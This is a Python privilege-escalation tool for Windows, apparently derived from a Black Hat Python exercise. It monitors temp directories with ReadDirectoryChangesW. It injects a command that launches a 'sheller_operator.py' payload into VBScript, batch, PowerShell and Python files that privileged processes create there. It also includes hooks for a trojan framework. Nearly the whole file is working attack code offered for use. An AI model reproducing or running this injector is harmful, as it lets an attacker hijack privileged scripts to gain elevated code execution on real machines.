#!/usr/bin/env python3
'''
Use for finding files created and executed by privileged processes
'''

import tempfile
import threading
import subprocess
import win32file
import win32con
import time
from pathlib import Path
import sheller_operator

verbose = True
dump_line = '-' * 78

# Common temp file directories to monitor
dirs_to_monitor = ['C:\\WINDOWS\\Temp', 'C:\\Temp', tempfile.gettempdir()]

# Make sure each directory exists
monitored_dirs = [dir for dir in dirs_to_monitor if Path(dir).exists()]

# File mod constants
FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

file_types = {}

buf = sheller_operator.get_buff()
command = r'python C:\\TEMP\\sheller\\sheller_operator.py'

file_types['.vbs'] = [
    '\r\n\'bhpmarker\r\n',
    '\r\nCreateObject(\"Wscript.Shell\").Run(\"{}\")\r\n'.format(command)]
file_types['.bat'] = [
    '\r\nREM bhpmarker\r\n',
    '\r\n{}\r\n'.format(command)]
file_types['.ps1'] = [
    '\r\n#bhpmarker\r\n',
    'Start-Process \"{}\"\r\n'.format(command)]
file_types['.py'] = [
    '\r\n#bhpmarker\r\n',
    '\r\nimport subprocess\r\nsubprocess.call(\'{}\')\r\n'.format(command)]


def vprint(verbose_string, lverbose=False):
    '''
    Prints output lines with custom icons if specified for lverbose
    '''
    global verbose
    if lverbose or verbose:
        if lverbose:
            icon = lverbose
        else:
            icon = '*'
        print('[{}] {}'.format(icon, verbose_string), flush=True)


# Perform code injection
def inject_code(filename, extension):
    # Is file marked?
    contents = filename.read_bytes()
    if file_types[extension][0].encode() in contents:
        return

    # No marker continue
    full_contents = file_types[extension][0].encode()
    full_contents += file_types[extension][1].encode()
    full_contents += contents
    filename.write_bytes(full_contents)

    return full_contents


def start_monitor(path_to_watch, test=False):
    '''
    Looks for file changes in the provided path to watch
    '''
    path_to_watch = Path(path_to_watch).resolve()

    # Create a thread for each run
    FILE_LIST_DIRECTORY = 0x0001

    h_directory = win32file.CreateFile(
        str(path_to_watch),
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ |
        win32con.FILE_SHARE_WRITE |
        win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None)

    if test:
        time_to_run = 30  # seconds
    else:
        time_to_run = 60 * 60 * 24  # 24 hrs

    timeout = time.time() + time_to_run
    patience = 0.05
    while True:
        try:
            time.sleep(patience)  # Patience
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_SIZE |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY,
                None,
                None)

            for action, file_name in results:
                filename = path_to_watch.joinpath(file_name)

                if action == FILE_CREATED:
                    vprint('Created {}'.format(filename), '+')
                    current = time.time()
                    if current > timeout:
                        break
                    vprint('Time: {}'.format(current))
                elif action == FILE_DELETED:
                    vprint('Deleted {}'.format(filename), '-')
                    current = time.time()
                    if current > timeout:
                        break
                    vprint('Time: {}'.format(current))
                    time.sleep(patience)  # Patience
                elif action == FILE_MODIFIED:
                    extension = filename.suffix
                    try:
                        contents = None
                        if extension in file_types:
                            contents = inject_code(filename, extension)
                        else:
                            contents = filename.read_text()
                        vprint(dump_line, ' ')
                        vprint(contents)
                        vprint(dump_line, ' ')
                        vprint('Modified {}'.format(filename), '*')

                        # Dump file contents
                        vprint('Dump of file:', ' ')
                        vprint(dump_line, ' ')
                        current = time.time()
                        if current > timeout:
                            break
                        vprint('Time: {}'.format(current))
                    except Exception:
                        vprint('Dump failed:', '!')

                    if test:
                        try:
                            vprint('Testing!')
                            subprocess.call('python ' + str(filename))
                        except Exception:
                            raise

                elif action == FILE_RENAMED_FROM:
                    vprint('Renamed from: {}'.format(filename), '<')
                elif action == FILE_RENAMED_TO:
                    vprint('Renamed to: {}'.format(filename), '>')
                    current = time.time()
                    if current > timeout:
                        break
                    vprint('Time: {}'.format(current))
                    time.sleep(patience)  # Patience
                else:
                    vprint((
                        'Unknown event:\nAction: {}\nFile: {}'.format(
                            action,
                            filename)), '?')
        except Exception as esm:
            if test:
                print(path_to_watch)
                raise esm
            else:
                pass


def main(test=True):
    for path in dirs_to_monitor:
        monitor_thread = threading.Thread(
            target=start_monitor,
            args=(path, test,))
        vprint('Spawning monitor for path: {}'.format(path))
        monitor_thread.start()
        time.sleep(.5)  # Space out thread starts


def run(**args):
    '''
    Untested integration with tig_najort module
    '''
    if 'test' in args and args['test'] is True:
        return 'Temp file monitor code could be running'

    # Set receiving server
    if 'command' in args:
        command = args['command']

    if 'dirs' in args:
        dirs_to_monitor = list(args['dirs'])
        monitored_dirs = [dir for dir in dirs_to_monitor if Path(dir).exists()]
        unmonitored_dirs = [dir for dir in dirs_to_monitor if not Path(dir).exists()]
        vprint('Ignoring {}'.format(unmonitored_dirs))

    main(test=False)


if __name__ == '__main__':
    main(test=False)